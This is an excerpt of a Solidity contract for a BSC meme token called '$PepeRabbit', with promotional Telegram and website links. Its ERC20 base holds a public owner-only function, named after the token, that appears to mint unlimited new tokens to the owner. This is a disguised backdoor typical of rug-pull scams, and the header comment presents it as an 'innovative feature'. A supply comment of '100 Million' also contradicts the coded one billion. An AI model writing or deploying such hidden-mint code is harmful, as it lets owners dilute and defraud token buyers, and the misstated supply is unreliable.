...
//
// $PepeRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PepeRabbitBsc
//  📱 Website::https://pepe-rabbit.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeRabbit(uint256 amount) public onlyOwner {
 _PepeRabbit(msg.sender, amount);
    }
    ...
    function _PepeRabbit(address account, uint256 amount) internal virtual {
...
contract $PepeRabbit is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Rabbit", "PEPERABBIT") {
    _PepeRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}